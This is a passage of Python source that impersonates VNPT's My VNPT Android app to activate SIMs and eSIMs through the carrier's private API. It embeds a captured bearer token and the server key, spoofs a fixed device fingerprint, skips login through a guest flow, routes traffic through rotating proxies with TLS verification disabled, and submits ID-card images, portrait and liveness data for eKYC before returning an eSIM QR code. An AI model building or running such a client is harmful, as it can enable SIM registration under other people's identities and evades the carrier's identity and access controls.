    ocr_sign = cfg.get('ocr_data_sign') or cfg.get('signEKYC') or artifacts.get('ocrDataSign') or artifacts.get('signEKYC') or ''
    if not ocr_data or not ocr_sign:
        raise EsimRegistrationError('ocr_data and ocr_data_sign are required for ACTIVE_SIM eKYC')

    token_active = str(cfg.get('token_active') or '')
    if not token_active:
        token_resp = post_plain('/tel_service/active_sim/getEkycToken', {
            'msisdn': target_msisdn, 'orderId': order_id,
            'transId': context.get('booking_trans_id', ''),
            'session': session_id, 'page': 0, 'pageSize': 10,
        }, required=False)
        token_active = str(_esim_deep_find(token_resp, 'token_active', 'tokenActive', 'accessToken', 'token') or '')
    if not token_active:
        raise EsimRegistrationError('token_active is required (provide it or let getEkycToken return it)')

    challenge_code = str(cfg.get('challenge_code') or '')
    if not challenge_code:
        challenge_id = str(uuid.uuid4())
        challenge_body = {
            'feature': 'ACTIVE_SIM', 'msisdn': target_msisdn,
            'requestId': challenge_id,
            'secureCode': hashlib.sha256(f'{target_msisdn}|{challenge_id}|{SECRET_AUTHEN}'.encode()).hexdigest(),
            'session': session_id,
        }
        challenge_resp = post_v2('/tel_service/active_sim/v2/getChallengeCodeSdkEkyc', challenge_body)
        challenge_code = str(_esim_deep_find(challenge_resp, 'challengeCode', 'challenge_code') or '')
    if not challenge_code:
        raise EsimRegistrationError('getChallengeCodeSdkEkyc did not return challengeCode')

    def artifact(*keys):
        return str(_esim_deep_find(artifacts, *keys) or cfg.get(keys[0], '') or '')

    ekyc_request_id = str(uuid.uuid4())
    ekyc_body = {
        'liveness': artifact('liveness', 'liveNessFace'),
        'liveness_sign': artifact('liveness_sign', 'liveNessFaceSign'),
        'liveness_front': artifact('liveness_front', 'liveNessCardFront'),
        'liveness_front_sign': artifact('liveness_front_sign', 'liveNessCardFrontSign'),
        'liveness_back': artifact('liveness_back', 'liveNessCardBack'),
        'liveness_back_sign': artifact('liveness_back_sign', 'liveNessCardBackSign'),
        'masked': artifact('masked', 'maskedFace'),
        'masked_sign': artifact('masked_sign', 'maskedFaceSign'),
        'ekyc_data': ocr_data,
        'ekyc_datasign': ocr_sign,
        'ekyc_face': artifact('ekyc_face', 'liveNessFace'),
        'ekyc_facesign': artifact('ekyc_facesign', 'liveNessFaceSign'),
        'gender': str(cfg.get('gender', '')),
        'address': str(cfg.get('address', '')),
        'id_province_code': str(cfg.get('id_province_code', '')),
        'id_province_name': str(cfg.get('id_province_name', '')),
        'token_active': token_active,
        'frontImageBase64': _esim_file_to_b64(cccd_front),
        'backImageBase64': _esim_file_to_b64(cccd_back),
        'portraitImageBase64': _esim_file_to_b64(portrait),
        'ekyc_data_logid': artifact('ekyc_data_logid', 'logIdEKYC'),
        'ekyc_face_logid': artifact('ekyc_face_logid', 'liveNessFaceLogId'),
        'challengeCode': challenge_code,
        'clientSession': str(cfg.get('client_session') or CONFIG_CLIENT_SESSION),
        'log_id_live_ness_front_card': artifact('log_id_live_ness_front_card', 'livenessCardFrontLogId'),
        'log_id_live_ness_back_card': artifact('log_id_live_ness_back_card', 'livenessCardBackLogId'),
        'log_id_live_ness_face': artifact('log_id_live_ness_face', 'liveNessFaceLogId'),
        'log_id_mask_face': artifact('log_id_mask_face', 'maskedFaceLogId'),
        'msisdn': target_msisdn,
        'session': session_id,
        'requestOrderId': order_id,
        'requestId': ekyc_request_id,
        'dataGroupsResult': str(cfg.get('data_groups_result', '')),
        'dataNfcResultBase64': str(cfg.get('data_nfc_result_base64', '')),
        'dataNfcResultSign': str(cfg.get('data_nfc_result_sign', '')),
        'hashImageAvatarNfc': str(cfg.get('hash_image_avatar_nfc', '')),
        'logIdNfc': str(cfg.get('log_id_nfc', '')),
        'provinceCode': str(cfg.get('province_code', '')),
        'authenMethod': str(cfg.get('authen_method', '')),
        'hrmCode': str(cfg.get('hrm_code', '')),
    }
    verify_resp = post_v2('/tel_service/active_sim/v2/ekycVerify', ekyc_body)
    context['ekyc_verify'] = verify_resp

    contact_phone = _esim_normalize_msisdn(cfg.get('contact_phone') or target_msisdn)
    email = str(cfg.get('email', ''))
    contract_request_id = str(uuid.uuid4())
    secure_raw = '|'.join((target_msisdn, contract_request_id, session_id, challenge_code,
                           contact_phone, ocr_data, ocr_sign, order_id, SECRET_AUTHEN))
    contract_body = {
        'msisdn': target_msisdn,
        'requestId': contract_request_id,
        'session': session_id,
        'challengeCode': challenge_code,
        'contactPhone': contact_phone,
        'email': email,
        'secureCode': hashlib.sha256(secure_raw.encode()).hexdigest(),
        'ocrData': ocr_data,
        'ocrDataSign': ocr_sign,
        'requestOrderId': order_id,
    }
    contract_resp = post_v2('/tel_service/active_sim/v2/createContractEsim', contract_body)
    context['contract'] = contract_resp
    contract_result = _esim_deep_find(contract_resp, 'result') or {}
    contract_url = _esim_deep_find(contract_result, 'url', 'contractUrl', 'signUrl')
    if contract_url:
        log_cb(f'[ESIM] contract URL returned: {contract_url}')
    if not cfg.get('contract_signed'):
        result = {'ok': False, 'status': 'contract_pending', **context}
        _esim_save_result(result, cfg.get('result_file'))
        log_cb('[ESIM] Contract created. Complete signing in eContract, then rerun with contract_signed=true.')
        return result

    init_body = {
        'session': session_id,
        'token_active': token_active,
        'msisdn': target_msisdn,
        'order_id': order_id,
    }
    init_resp = post_plain('/mapi_v2/services/myvnpt_dktttb_init_esim', init_body)
    context['init_esim'] = init_resp
    qr_string = _esim_deep_find(init_resp, 'qrString', 'qr_string', 'qr', 'qrCode', 'qr_code')
    if not qr_string:
        raise EsimRegistrationError('init_esim did not return QR string')
    result = {'ok': True, 'status': 'esim_ready', 'qr': qr_string, **context}
    _esim_save_result(result, cfg.get('result_file'))
    log_cb('[ESIM] eSIM initialized successfully; QR saved in esim_result.json')
    return result


def _active_sim_bootstrap_device_context(log_cb=print, session_file=None):
    """Create the anonymous device context used before ACTIVE_SIM login state.

    The Android app performs ``initDevice`` silently when it starts.  The
    desktop ACTIVE_SIM tab must do the same; it must not call
    ``authen_msisdn`` or ask for a phone/password just to obtain the RSA and
    bearer/device context needed by the API.
    """
    # ACTIVE_SIM auth methods are device-context sensitive.  A random profile
    # creates a valid guest challenge but the backend omits REUSE_INFO.  Keep
    # the Android fingerprint from the captured source flow stable, while
    # still generating fresh RSA/session material on every run.
    profile = {
        'di': (
            '3da6d313-ac4e-4acb-bd86-ed5fd49c7ad7|'
            '3da6d313-ac4e-4acb-bd86-ed5fd49c7ad7|unknown|Android||'
            '3.4.07.Prd|25053RT47C|16|'
        ),
        'model': '25053RT47C',
        'android_ver': '16',
        'fcm_token': '',
        'mac': '3da6d313ac4e4acb',
    }
    private_key = RSA.generate(2048)
    private_b64 = base64.b64encode(
        private_key.export_key('DER', pkcs=8)).decode('ascii')
    public_b64 = base64.b64encode(
        private_key.publickey().export_key('DER')).decode('ascii')
    init_server_key = (
        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEZrm+72VDaEzV4PAzYlt'
        'gnWQnhlYYjD/i1ABMB2UKU9wVNrKDXPwLoI1+yE2AnkbqZeBy1dXSNuxvhC030nN'
        '78kav8cX3QE2JsQf6Z/dadZcGCOL41x4AVcynDt+70QGtur5tHU4D56MQltnCpX6D'
        'mDlE2foe9XUQcd5XyHc2x8dnm9OZLCUhjK2xWTPRk80Uu/aU6rb1QtCB59/YWXsyf'
        'eaLHuvuKBPeMUSPlIDRj5zN6UCPZMsDUZxdSzQIaisS3I1oKGOMaAeAgMcISFUM/8r'
        'yH8yzvUAy0ANYjbyW8dj63WHHyXZcXkoLyMAmuze30oHjtE61iVmTiciYpYYQIDAQAB')
    bearer = 'Bearer ' + (
        'a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b')
    init_plain = json.dumps({
        'clientPublicKey': public_b64,
        'osName': profile['android_ver'],
        'deviceName': profile['model'],
    }, separators=(',', ':'))
    request_data = aes_encrypt(init_plain, AES_MASTER_KEY)
    init_secret = rsa_encrypt_no_padding(AES_MASTER_KEY, init_server_key)
    init_signature = sign_sha256_rsa(request_data, private_b64)
    headers = {
        'Authorization': bearer,
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept-Encoding': 'gzip',
        'Cache-Control': 'no-cache',
        'Channel-Code': 'APP',
        'Device-Info': profile['di'],
        'Language': 'vi_VN',
        'partnerCode': 'MYVNPT',
        'User-Agent': 'okhttp/4.7.2',
        'X-Secret-Key': init_secret,
        'X-Signature': init_signature,
    }
    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        pass
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)
    log_cb('[ACTIVE_SIM] initDevice ẩn (không đăng nhập My VNPT)...')
    try:
        response = http.post(
            MYVNPT_BASE + '/tel_service/device/initDevice',
            headers=headers,
            json={'requestData': request_data},
            timeout=60,
            verify=False,
        )
        outer = response.json()
    except Exception as exc:
        raise EsimRegistrationError(f'ACTIVE_SIM initDevice: {exc}') from exc
    if response.status_code != 200 or not isinstance(outer, dict) or not outer.get('data'):
        message = _esim_deep_find(outer, 'message', 'msg') or response.text[:300]
        raise EsimRegistrationError(
            f'ACTIVE_SIM initDevice: HTTP {response.status_code} - {message}')
    try:
        server_public_key = _esim_deep_find(
            json.loads(aes_decrypt_gen(outer['data'], AES_MASTER_KEY)),
            'serverPublicKey', 'server_public_key')
    except Exception as exc:
        raise EsimRegistrationError(
            f'ACTIVE_SIM initDevice response decrypt failed: {exc}') from exc
    if not server_public_key:
        raise EsimRegistrationError(
            'ACTIVE_SIM initDevice không trả về serverPublicKey.')
    session_data = {
        'rsa_key_private': aes_encrypt(private_b64, AES_MASTER_KEY),
        'server_public_key': aes_encrypt(server_public_key, AES_MASTER_KEY),
        'login_session': '',
        'API_SESSION_ID': '',
        'KEY_ENCRYPT_AES': AES_MASTER_KEY,
        'BEARER_TOKEN': bearer,
        'DEVICE_INFO': profile['di'],
        'MAC_ADDRESS': profile['mac'],
        '_saved_at': time.strftime('%Y-%m-%d %H:%M:%S'),
    }
    output_path = session_file or DEVICE_SESSION_JSON
    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
    with open(output_path, 'w', encoding='utf-8') as session_handle:
        json.dump(session_data, session_handle, ensure_ascii=False, indent=2)
    log_cb('[ACTIVE_SIM] initDevice OK; đã tạo device context guest.')
    return session_data


def _active_sim_session_context(config, session_file=None, log_cb=print):
    """Load the device/API context used by ACTIVE_SIM.

    ACTIVE_SIM has two source-app modes.  A logged-in user uses
    ``API_SESSION_ID``/``API_MSISDN_LOGIN``.  The phone app also supports a
    guest path: it has no My VNPT password login, sends an empty session to
    ``regCheckInfo`` and carries the temporary challenge values
    ``MSISDN_CHALLENGE_CODE``/``API_TOKEN_CHALLENGE_CODE`` in memory.  Keep
    those modes separate; an absent login session is not an instruction to ask
    the user for phone/password.
    """
    cfg = _esim_load_config(config)
    session_path = (session_file or cfg.get('active_sim_session_file') or
                    DEVICE_SESSION_JSON)
    if not os.path.exists(session_path):
        if session_file:
            raise EsimRegistrationError(
                'Không tìm thấy device/challenge context ACTIVE_SIM đã chỉ định.')
        _active_sim_bootstrap_device_context(
            log_cb=log_cb, session_file=session_path)

    try:
        with open(session_path, 'r', encoding='utf-8') as session_handle:
            session_data = json.load(session_handle)
    except Exception as exc:
        raise EsimRegistrationError(f'Khong doc duoc My VNPT session: {exc}') from exc

    master_key = session_data.get('KEY_ENCRYPT_AES') or AES_MASTER_KEY
    try:
        private_key = _esim_decrypt_with_master(
            session_data.get('rsa_key_private', ''), master_key)
        server_public_key = _esim_decrypt_with_master(
            session_data.get('server_public_key', ''), master_key)
    except Exception as exc:
        raise EsimRegistrationError(f'Khong giai ma device session: {exc}') from exc

    force_guest = bool(cfg.get('force_guest_active_sim'))
    login_session = '' if force_guest else (
        session_data.get('login_session') or
        session_data.get('API_SESSION_ID') or '')
    guest_msisdn = (session_data.get('MSISDN_CHALLENGE_CODE') or
                    cfg.get('guest_msisdn') or cfg.get('challenge_msisdn') or '')
    guest_token = (session_data.get('API_TOKEN_CHALLENGE_CODE') or
                   cfg.get('guest_token') or cfg.get('challenge_token') or '')
    # These fields may arrive from a captured regCheckInfo response rather
    # than from SharedPreferences.  They are still internal app state, never
    # customer-facing inputs.
    guest_msisdn = str(guest_msisdn or '').strip()
    guest_token = str(guest_token or '').strip()
    session_id = str(login_session or cfg.get('session', '') or '').strip()
    bearer = (session_data.get('BEARER_TOKEN') or
              session_data.get('Authorization') or cfg.get('authorization', ''))
    if bearer and not bearer.lower().startswith('bearer '):
        bearer = 'Bearer ' + bearer
    device_info = (session_data.get('DEVICE_INFO') or
                   session_data.get('Device-Info') or '')
    mac_address = (session_data.get('MAC_ADDRESS') or
                   session_data.get('mac-address') or '')
    if not bearer or not device_info:
        raise EsimRegistrationError(
            'ACTIVE_SIM tự khởi tạo thiếu bearer hoặc Device-Info; hãy chạy lại.'
        )
    if not private_key or not server_public_key:
        raise EsimRegistrationError(
            'ACTIVE_SIM tự khởi tạo thiếu RSA key; hãy chạy lại.'
        )
    logged_in = bool(login_session)
    if not logged_in and not (guest_msisdn or guest_token):
        # The source app can still reach regCheckInfo with an empty session,
        # but the later auth/challenge requests need the temporary values.  Do
        # not label this as a failed My VNPT login because that is not what the
        # source flow requires.
        log_cb('[ACTIVE_SIM] Không có My VNPT login; dùng guest flow. '
               'Challenge values sẽ được lấy từ regCheckInfo nếu response trả về.')
    return {
        'cfg': cfg,
        'session_data': session_data,
        'session_file': session_path,
        'logged_in': logged_in,
        'guest_msisdn': guest_msisdn,
        'guest_token': guest_token,
        # Source UIV3 mapping:
        # getAuthenMethods: session=MSISDN_CHALLENGE_CODE,
        #                  msisdn=API_TOKEN_CHALLENGE_CODE
        # getChallengeCode: session=API_TOKEN_CHALLENGE_CODE,
        #                   msisdn=MSISDN_CHALLENGE_CODE
        'session': session_id,
        'reg_session': session_id if logged_in else '',
        'reg_msisdn': str(
            cfg.get('msisdn') or
            (session_data.get('API_MSISDN_LOGIN') if logged_in else '') or ''
        ).strip(),
        'list_session': session_id if logged_in else '',
        'list_msisdn': str(
            cfg.get('msisdn') or
            session_data.get('API_MSISDN') or
            (session_data.get('API_MSISDN_LOGIN') if logged_in else '') or ''
        ).strip(),
        'auth_session': session_id if logged_in else guest_msisdn,
        'auth_msisdn': str(
            cfg.get('auth_msisdn') or
            (session_data.get('API_MSISDN_LOGIN') if logged_in else guest_token) or ''
        ).strip(),
        'challenge_session': session_id if logged_in else guest_token,
        'challenge_msisdn': str(
            cfg.get('target_msisdn') or cfg.get('msisdn') or
            (session_data.get('API_MSISDN_LOGIN') if logged_in else guest_msisdn) or ''
        ).strip(),
        'bearer': bearer,
        'device_info': device_info,
        'mac_address': mac_address,
        'private_key': private_key,
        'server_public_key': server_public_key,
    }


def _active_sim_http_context(context):
    """Create the requests session and small API helpers for ACTIVE_SIM."""
    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        pass

    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)

    def base_headers():
        headers = {
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'Cache-Control': 'no-cache',
            'Connection': 'Keep-Alive',
            'Content-Type': 'application/json; charset=UTF-8',
            'Device-Info': context['device_info'],
            'Language': 'vi_VN',
            'Authorization': context['bearer'],
            'User-Agent': 'okhttp/4.7.2',
        }
        return headers

    def post_plain(endpoint, body, log_cb=print):
        log_cb(f'[ACTIVE_SIM] POST {endpoint}')
        try:
            response = http.post(MYVNPT_BASE + endpoint, headers=base_headers(),
                                 json=body, timeout=90, verify=False)
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        try:
            payload = response.json()
        except Exception:
            payload = {'raw': response.text[:1000]}
        if response.status_code != 200:
            message = _esim_deep_find(payload, 'message', 'msg') or response.text[:300]
            raise EsimRegistrationError(
                f'{endpoint}: HTTP {response.status_code} - {message}')
        code = _esim_error_code(payload)
        if code not in ('', '0', '00', '200', 'success', 'true'):
            message = _esim_deep_find(payload, 'message', 'msg') or 'server rejected request'
            raise EsimRegistrationError(f'{endpoint}: {code} - {message}')
        return payload

    def post_encrypted(endpoint, body, log_cb=print, accepted_error_codes=()):
        """POST the encrypted v2-style request used by regCheckInfo."""
        accepted_codes = {
            str(code).strip().lower() for code in accepted_error_codes
        }
        aes_key = ''.join(secrets.choice(string.ascii_letters + string.digits)
                          for _ in range(32))
        request_data = aes_encrypt(
            json.dumps(body, separators=(',', ':'), ensure_ascii=False), aes_key)
        headers = base_headers()
        # regCheckInfo is the encrypted v2 endpoint; its capture includes the
        # app channel/partner headers in addition to the common headers.
        headers['Channel-Code'] = 'APP'
        headers['partnerCode'] = 'MYVNPT'
        headers['X-Secret-Key'] = rsa_encrypt_no_padding(
            aes_key, context['server_public_key'])
        headers['X-Signature'] = sign_sha256_rsa(
            request_data, context['private_key'])
        log_cb(f'[ACTIVE_SIM] POST {endpoint} (encrypted)')
        try:
            response = http.post(MYVNPT_BASE + endpoint, headers=headers,
                                 json={'requestData': request_data},
                                 timeout=120, verify=False)
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        try:
            outer = response.json()
        except Exception:
            raise EsimRegistrationError(f'{endpoint}: response khong phai JSON')
        inner = outer
        encrypted_response = outer.get('data') if isinstance(outer, dict) else None
        if isinstance(encrypted_response, str) and encrypted_response:
            try:
                inner = json.loads(aes_decrypt_gen(encrypted_response, aes_key))
            except Exception as exc:
                raise EsimRegistrationError(
                    f'{endpoint}: khong giai ma duoc response ({exc})') from exc
        if response.status_code != 200:
            code = _esim_error_code(inner) or _esim_error_code(outer)
            message = (_esim_deep_find(inner, 'message', 'msg') or
                       _esim_deep_find(outer, 'message', 'msg') or
                       'server rejected request')
            code_text = f'{code} - ' if code else ''
            raise EsimRegistrationError(
                f'{endpoint}: HTTP {response.status_code} - {code_text}{message}')
        code = _esim_error_code(inner) or _esim_error_code(outer)
        if (code not in ('', '0', '00', '200', 'success', 'true') and
                code not in accepted_codes):
            message = (_esim_deep_find(inner, 'message', 'msg') or
                       _esim_deep_find(outer, 'message', 'msg') or
                       'server rejected request')
            raise EsimRegistrationError(f'{endpoint}: {code} - {message}')
        return {'outer': outer, 'data': inner}

    return http, post_plain, post_encrypted


def _active_sim_msisdn(value, preserve_hash=True):
    value = str(value or '').strip().replace(' ', '')
    if preserve_hash and re.fullmatch(r'[0-9a-fA-F]{64}', value or ''):
        return value
    return _esim_normalize_msisdn(value)


def _active_sim_redact_tokens(value):
    """Redact short-lived ACTIVE_SIM tokens before writing history/log output."""
    token_keys = {'activetoken', 'active_token', 'token_active'}
    if isinstance(value, dict):
        return {
            key: ('[redacted]' if str(key).lower() in token_keys
                  else _active_sim_redact_tokens(item))
            for key, item in value.items()
        }
    if isinstance(value, list):
        return [_active_sim_redact_tokens(item) for item in value]
    return value


def run_active_sim_discovery(config, session_file=None, log_cb=print):
    """Run the source discovery order and return available auth methods.

    UIV3 calls ``regCheckInfo`` before it requests the auth-method list.  That
    call fills the anonymous challenge values when the app is not logged in.
    """
    initial_cfg = _esim_load_config(config)
    if (initial_cfg.get('auto_active_sim_context') and not session_file and
            not initial_cfg.get('_active_sim_context_ready')):
        initial_cfg['active_sim_session_file'] = ACTIVE_SIM_SESSION_JSON
        _active_sim_bootstrap_device_context(
            log_cb=log_cb, session_file=ACTIVE_SIM_SESSION_JSON)
        initial_cfg['_active_sim_context_ready'] = True
        config = initial_cfg

    context = _active_sim_session_context(config, session_file=session_file,
                                          log_cb=log_cb)
    cfg = context['cfg']
    serial = str(cfg.get('serial') or cfg.get('serial_sim') or '').strip()
    if not serial:
        raise EsimRegistrationError('Serial SIM là bắt buộc cho luồng ACTIVE_SIM.')

    reg_result = cfg.get('reg_check_result') if isinstance(
        cfg.get('reg_check_result'), dict) else None
    if not reg_result:
        log_cb('[ACTIVE_SIM] regCheckInfo trước discovery (guest path giống app)...')
        reg_result = run_active_sim_reg_check(
            cfg, session_file=session_file, log_cb=log_cb)
        cfg['reg_check_result'] = reg_result
        if reg_result.get('trans_id'):
            cfg['trans_id'] = reg_result['trans_id']
        if reg_result.get('order_id'):
            cfg['request_order_id'] = reg_result['order_id']
        if reg_result.get('province'):
            cfg['province'] = reg_result['province']
        cfg['activation_session'] = reg_result.get('activation_session') or ''
        cfg['token_active'] = reg_result.get('active_token') or ''
        if not context.get('logged_in'):
            cfg['guest_msisdn'] = (reg_result.get('challenge_msisdn') or
                                   reg_result.get('msisdn') or
                                   cfg.get('guest_msisdn') or '')
            cfg['guest_token'] = (reg_result.get('challenge_token') or
                                  reg_result.get('active_token') or
                                  cfg.get('guest_token') or '')
        # Re-read the context so the auth-method request uses the challenge
        # values returned by regCheckInfo, not the empty pre-bootstrap state.
        context = _active_sim_session_context(config, session_file=session_file,
                                              log_cb=log_cb)
        cfg = context['cfg']
    _http, post_plain, _post_encrypted = _active_sim_http_context(context)
    msisdn = _active_sim_msisdn(
        context.get('list_msisdn') or cfg.get('msisdn', ''),
        preserve_hash=False)
    if context.get('logged_in'):
        auth_msisdn = _active_sim_msisdn(
            context.get('auth_msisdn') or msisdn, preserve_hash=False)
    else:
        # UIV3 guest path forwards the challenge token exactly as returned by
        # the app.  It is not a phone number and must not be normalized as one.
        auth_msisdn = str(context.get('auth_msisdn') or '').strip()
    # The original app hard-codes the first page of five rows.  These are API
    # pagination parameters, not customer inputs and must not be exposed as
    # part of the ACTIVE_SIM workflow.
    page = 0
    page_size = 5

    cutoff = post_plain('/package_service/simso_order/getDktttbCutOffTime', {
        'msisdn': msisdn,
        'requestId': str(uuid.uuid4()),
    }, log_cb=log_cb)
    try:
        active_sims = post_plain('/tel_service/active_sim/getListActiveSim', {
            'msisdn': msisdn,
            'page': page,
            'pageSize': page_size,
            'session': context.get('list_session', ''),
        }, log_cb=log_cb)
    except EsimRegistrationError as exc:
        if context.get('logged_in'):
            raise
        # The captured guest app request can return 401 here; UIV3 still
        # continues with regCheckInfo/auth methods and serial input.
        log_cb(f'[ACTIVE_SIM] Bỏ qua getListActiveSim guest: {exc}')
        active_sims = {'result': [], 'guest_discovery_error': str(exc)}
    try:
        auth_methods = post_plain('/tel_service/update_info/getAuthenMethods', {
            'feature': 'ACTIVE_SIM',
            'msisdn': auth_msisdn,
            'requestId': str(uuid.uuid4()),
            'session': context.get('auth_session', ''),
        }, log_cb=log_cb)
    except EsimRegistrationError as exc:
        if context.get('logged_in'):
            raise
        raise EsimRegistrationError(
            'Không lấy được phương thức xác thực ACTIVE_SIM từ guest challenge: '
            f'{exc}') from exc
    # ACTIVE_SIM in this desktop flow intentionally follows the source
    # REUSE_INFO branch only; NFC/VNeID/passport are different UI pipelines.
    selected_auth = 'REUSE_INFO'
    cfg['authen_code'] = selected_auth
    cfg['authen_method'] = selected_auth
    method_rows = _esim_deep_find(auth_methods, 'result')
    if isinstance(method_rows, list) and method_rows:
        enabled_codes = {
            str(row.get('authenCode') or row.get('authen_code') or
                row.get('code') or '').strip()
            for row in method_rows if isinstance(row, dict) and str(row.get('status', 1)) != '0'
        }
        if selected_auth not in enabled_codes:
            raise EsimRegistrationError(
                f'Phương thức {selected_auth} không có trong auth methods ACTIVE_SIM hiện tại. '
                f'API hiện trả: {", ".join(sorted(code for code in enabled_codes if code)) or "(trống)"}. '
                'ACTIVE_SIM đã tự tạo context/challenge mới; hãy chạy lại nếu phiên vừa hết hạn.')

    selected_sim = None
    if serial and isinstance(active_sims, dict):
        rows = _esim_deep_find(active_sims, 'result')
        if isinstance(rows, list):
            for row in rows:
                if not isinstance(row, dict):
                    continue
                row_serial = str(
                    row.get('serialSim') or row.get('serial_sim') or
                    row.get('simSerial') or row.get('serial') or '').strip()
                if row_serial == serial:
                    selected_sim = row
                    break
    if serial and selected_sim is None:
        # UIV3 proceeds from the serial input to postRegCheckInfoV2; the list
        # request is only discovery/UI data and is not a customer input or a
        # hard prerequisite for the source flow.
        log_cb('[ACTIVE_SIM] Không thấy serial trong danh sách discovery; '
               'tiếp tục theo luồng regCheckInfo của app.')

    result = {
        'ok': True,
        'status': 'active_sim_discovered',
        'msisdn': msisdn,
        'auth_msisdn': auth_msisdn,
        'auth_session': context.get('auth_session', ''),
        'serial': serial,
        'selected_sim': selected_sim,
        'cutoff': cutoff,
        'active_sims': active_sims,
        'auth_methods': auth_methods,
        'reg_check_result': reg_result,
    }
    _esim_save_result(result, cfg.get('result_file') or
                      os.path.join(HISTORY_DIR, 'active_sim_result.json'))
    return result


def run_active_sim_dgv_info(config, session_file=None, log_cb=print):
    """Fetch the TTKD/DGV information used by the SIM contract screen."""
    context = _active_sim_session_context(config, session_file=session_file,
                                          log_cb=log_cb)
    cfg = context['cfg']
    _http, post_plain, _post_encrypted = _active_sim_http_context(context)
    selected_sim = cfg.get('selected_sim') if isinstance(cfg.get('selected_sim'), dict) else {}
    reg_result = cfg.get('reg_check_result') if isinstance(cfg.get('reg_check_result'), dict) else {}
    province = str(
        cfg.get('province') or selected_sim.get('provinceCode') or
        _esim_deep_find(reg_result, 'provinceCode', 'province_code') or 'HCM'
    ).strip().upper()
    # Source ``UIV2PreviewContractViewModel`` passes ``token_active`` as the
    # DGV request's ``session``.  It is returned by regCheckInfo and is not the
    # My VNPT login session or a customer-entered value.
    activation_session = str(
        cfg.get('activation_session') or
        _esim_deep_find(reg_result, 'activeToken', 'active_token', 'token_active') or
        cfg.get('token_active') or '').strip()
    trans_id = str(
        cfg.get('trans_id') or cfg.get('transId') or
        _esim_deep_find(reg_result, 'transId', 'trans_id', 'transactionId') or
        selected_sim.get('transId') or selected_sim.get('trans_id') or '').strip()
    if not province:
        raise EsimRegistrationError('province là bắt buộc cho myvnpt_dktt_dgv_info')
    if not activation_session:
        raise EsimRegistrationError(
            'regCheckInfo chưa trả về activeToken cho bước DGV.')
    if not trans_id:
        raise EsimRegistrationError('transId là bắt buộc cho myvnpt_dktt_dgv_info')

    response = post_plain('/mapi_v2/services/myvnpt_dktt_dgv_info', {
        'province': province,
        'session': activation_session,
        'transId': trans_id,
    }, log_cb=log_cb)
    result = {
        'ok': True,
        'status': 'active_sim_dgv_info_loaded',
        'province': province,
        'transId': trans_id,
        'dgv_info': response,
    }
    _esim_save_result(result, cfg.get('result_file') or
                      os.path.join(HISTORY_DIR, 'active_sim_dgv_result.json'))
    return result


def run_active_sim_reg_check(config, session_file=None, log_cb=print):
    """Send the source-model payload to encrypted ACTIVE_SIM regCheckInfo.

    The original ``SimRegCheckInfoV2Request`` contains only the inherited
    ``msisdn``/``session`` fields plus ``requestId`` and ``serialSim``.  Do
    not send the unrelated hand-written payload that was previously exposed
    by the GUI.
    """
    context = _active_sim_session_context(config, session_file=session_file,
                                          log_cb=log_cb)
    cfg = context['cfg']
    serial = str(cfg.get('serial') or cfg.get('serial_sim') or '').strip()
    if not serial:
        raise EsimRegistrationError('Serial SIM là bắt buộc cho regCheckInfo.')
    # UIV3 ``postRegCheckInfoV2`` leaves both inherited fields empty for the
    # guest path.  A logged-in path carries the normal session/MSISDN.
    body = {
        'msisdn': _active_sim_msisdn(context.get('reg_msisdn', ''), preserve_hash=False),
        'session': context.get('reg_session', ''),
        'requestId': str(uuid.uuid4()),
        'serialSim': serial,
    }

    _http, _post_plain, post_encrypted = _active_sim_http_context(context)
    response = post_encrypted('/tel_service/active_sim/v2/regCheckInfo', body,
                              log_cb=log_cb)
    result = {
        'ok': True,
        'status': 'active_sim_reg_check_sent',
        'request': body,
        'response': response,
    }
    response_data = response.get('data') if isinstance(response, dict) else response
    result['trans_id'] = str(
        _esim_deep_find(response_data, 'transId', 'trans_id', 'transactionId') or '')
    result['order_id'] = str(
        _esim_deep_find(response_data, 'orderId', 'order_id', 'orderID') or '')
    result['province'] = str(
        _esim_deep_find(response_data, 'provinceCode', 'province_code') or '')
    result['msisdn'] = str(
        _esim_deep_find(response_data, 'msisdn', 'activePhone', 'customerPhone') or
        _esim_deep_find(response, 'msisdn', 'activePhone', 'customerPhone') or '').strip()
    result['customer_phone'] = str(
        _esim_deep_find(response_data, 'customerPhone', 'customer_phone') or '').strip()
    result['challenge_msisdn'] = str(
        _esim_deep_find(response_data, 'msidnChallengeCode', 'msisdnChallengeCode',
                        'challengeMsisdn') or '').strip()
    result['challenge_token'] = str(
        _esim_deep_find(response_data, 'tokenChallengeCode', 'challengeToken') or '').strip()
    result['active_token'] = str(
        _esim_deep_find(response_data, 'activeToken', 'active_token', 'token_active') or
        _esim_deep_find(response, 'activeToken', 'active_token', 'token_active') or '').strip()
    if not result['active_token']:
        raise EsimRegistrationError(
            'regCheckInfo chưa trả về activeToken; không thể gọi myvnpt_dktt_dgv_info.')
    # UIV3 initially copies these two values from regCheckInfo into the guest
    # challenge state, then replaces them with AppVNPT globals when available.
    # Use the response values as the anonymous fallback when no prior app
    # globals were imported into the desktop context.
    result['challenge_msisdn'] = result['challenge_msisdn'] or result['msisdn']
    result['challenge_token'] = result['challenge_token'] or result['active_token']
    result['activation_session'] = result['active_token']
    # Keep the live session and activation token out of persisted history.  They
    # stay in memory for the request only, just like the device RSA keys.
    saved_request = dict(body)
    saved_request['session'] = ''
    saved_response = _active_sim_redact_tokens(response)
    _esim_save_result({
        'ok': True,
        'status': result['status'],
        'request': saved_request,
        'response': saved_response,
        'trans_id': result['trans_id'],
        'order_id': result['order_id'],
        'province': result['province'],
        }, cfg.get('result_file') or
                     os.path.join(HISTORY_DIR, 'active_sim_reg_check_result.json'))
    return result


def run_active_sim_ekyc(config, session_file=None, log_cb=print,
                        confirm_callback=None):
